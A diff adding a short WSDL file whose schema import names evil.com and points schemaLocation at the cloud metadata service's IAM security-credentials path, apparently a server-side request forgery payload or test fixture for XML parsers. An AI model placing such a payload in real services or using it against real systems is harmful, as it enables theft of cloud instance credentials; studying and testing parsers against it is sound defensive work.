@@ -1,0 +1,9 @@
+<definitions xmlns="http://schemas.xmlsoap.org/wsdl/"
+             xmlns:xsd="http://www.w3.org/2001/XMLSchema">
+  <types>
+    <xsd:schema>
+      <xsd:import namespace="http://evil.com/"
+                  schemaLocation="http://169.254.169.254/latest/meta-data/iam/security-credentials/"/>
+    </xsd:schema>
+  </types>
+</definitions>
